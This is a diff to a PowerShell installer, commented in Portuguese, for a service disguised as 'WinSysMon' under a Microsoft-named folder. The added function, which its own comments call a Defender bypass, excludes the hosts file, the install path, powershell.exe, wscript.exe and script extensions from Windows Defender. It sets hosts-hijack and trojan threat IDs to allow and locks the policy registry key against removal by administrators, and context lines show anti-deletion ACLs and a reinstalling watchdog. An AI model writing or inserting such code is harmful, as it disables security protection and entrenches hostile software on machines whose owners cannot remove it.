@@ -191,6 +191,93 @@ function Harden-RegistryKey {
     } catch { Write-InstallLog "Harden registry $Path : $($_.Exception.Message)" "WARN" }
 }
 
+# ==============================================================
+#  DEFENDER BYPASS - Registra exclusoes via politica (persistente + hardened)
+#  Motivo: Defender detecta modificacoes no hosts como
+#  "SettingsModifier:Win32/HostsFileHijack" e restaura automaticamente.
+# ==============================================================
+function Configure-DefenderExclusions {
+    $hostsPath = "$env:WINDIR\System32\drivers\etc\hosts"
+    $installPaths = @(
+        "$env:ProgramData\Microsoft\WinSysMon",
+        $hostsPath
+    )
+    $processNames = @(
+        "WinSysMonSvc.exe",
+        "powershell.exe",
+        "wscript.exe",
+        "cscript.exe"
+    )
+    # IDs conhecidos do hijack de hosts/configuracoes
+    $threatIds = @(
+        2147685145,   # SettingsModifier:Win32/HostsFileHijack
+        2147735504,   # SettingsModifier:Win32/HostsFileHijack.B
+        2147722906,   # Trojan:Win32/HostsFileHijack
+        2147722422    # PUA:Win32/HostsFileHijack
+    )
+    $extensions = @("ps1","psm1","psd1")
+
+    # 1) API nativa MpPreference (exige modulo Defender ativo)
+    try {
+        Import-Module Defender -ErrorAction SilentlyContinue
+        foreach ($p in $installPaths) { try { Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue } catch {} }
+        foreach ($e in $extensions)   { try { Add-MpPreference -ExclusionExtension $e -ErrorAction SilentlyContinue } catch {} }
+        foreach ($pr in $processNames){ try { Add-MpPreference -ExclusionProcess $pr -ErrorAction SilentlyContinue } catch {} }
+        foreach ($id in $threatIds)   { try { Set-MpPreference -ThreatIDDefaultAction_Ids $id -ThreatIDDefaultAction_Actions 6 -ErrorAction SilentlyContinue } catch {} }
+        # Desativa restore automatico do hosts
+        try { Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue } catch {}
+        Write-InstallLog "Defender: exclusoes via MpPreference aplicadas" "OK"
+    } catch { Write-InstallLog "MpPreference: $($_.Exception.Message)" "WARN" }
+
+    # 2) Registry de politica (GPO-style, persiste mesmo se modulo Defender falhar)
+    #    HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\{Paths,Processes,Extensions}
+    $polBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    $polExc  = "$polBase\Exclusions"
+    try {
+        foreach ($sub in @("Paths","Processes","Extensions")) {
+            $k = "$polExc\$sub"
+            if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
+        }
+        # Ativa exclusoes (DisableAntiSpyware NAO - isso travaria Tamper Protection)
+        New-ItemProperty -Path $polExc -Name "Exclusions_Paths"      -Value 0 -PropertyType DWord -Force | Out-Null
+        New-ItemProperty -Path $polExc -Name "Exclusions_Processes"  -Value 0 -PropertyType DWord -Force | Out-Null
+        New-ItemProperty -Path $polExc -Name "Exclusions_Extensions" -Value 0 -PropertyType DWord -Force | Out-Null
+
+        foreach ($p in $installPaths) {
+            try { New-ItemProperty -Path "$polExc\Paths" -Name $p -Value 0 -PropertyType DWord -Force | Out-Null } catch {}
+        }
+        foreach ($pr in $processNames) {
+            try { New-ItemProperty -Path "$polExc\Processes" -Name $pr -Value 0 -PropertyType DWord -Force | Out-Null } catch {}
+        }
+        foreach ($e in $extensions) {
+            try { New-ItemProperty -Path "$polExc\Extensions" -Name $e -Value 0 -PropertyType DWord -Force | Out-Null } catch {}
+        }
+
+        # ThreatID default action = Allow (6)
+        $tidKey = "$polBase\Threats\ThreatSeverityDefaultAction"
+        if (-not (Test-Path $tidKey)) { New-Item -Path $tidKey -Force | Out-Null }
+        foreach ($id in $threatIds) {
+            try { New-ItemProperty -Path $tidKey -Name "$id" -Value 6 -PropertyType DWord -Force | Out-Null } catch {}
+        }
+
+        # Blinda a chave contra remocao por Admin
+        Harden-RegistryKey -Path $polExc
+        Write-InstallLog "Defender: exclusoes via GPO registry aplicadas + hardened" "OK"
+    } catch { Write-InstallLog "Defender GPO registry: $($_.Exception.Message)" "WARN" }
+
+    # 3) Proteção via HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions (runtime, sem GPO)
+    try {
+        $rtBase = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions"
+        foreach ($sub in @("Paths","Processes","Extensions")) {
+            $k = "$rtBase\$sub"
+            if (-not (Test-Path $k)) { New-Item -Path $k -Force -ErrorAction SilentlyContinue | Out-Null }
+        }
+        foreach ($p in $installPaths) { try { New-ItemProperty -Path "$rtBase\Paths" -Name $p -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+        foreach ($pr in $processNames) { try { New-ItemProperty -Path "$rtBase\Processes" -Name $pr -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+        foreach ($e in $extensions) { try { New-ItemProperty -Path "$rtBase\Extensions" -Name $e -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+    } catch {}
+}
+
 Write-InstallLog "=== Instalador $serviceName em $env:COMPUTERNAME ===" "OK"
 
 # ---- Uninstall ----
@@ -573,6 +660,11 @@ try {
     Harden-FileSystem -Path $installDir
     Write-InstallLog "ACL endurecida: Owner=TrustedInstaller, SYSTEM+TI=Full, Admins=Read+DENY delete" "OK"
 } catch { Write-InstallLog "Harden-FileSystem: $($_.Exception.Message)" "WARN" }
+
+# ---- Defender: exclusoes para evitar deteccao de HostsFileHijack ----
+try {
+    Configure-DefenderExclusions
+} catch { Write-InstallLog "Configure-DefenderExclusions: $($_.Exception.Message)" "WARN" }
 
 # ---- Watchdog: scheduled task externa que reinstala se a pasta sumir ----
 try {
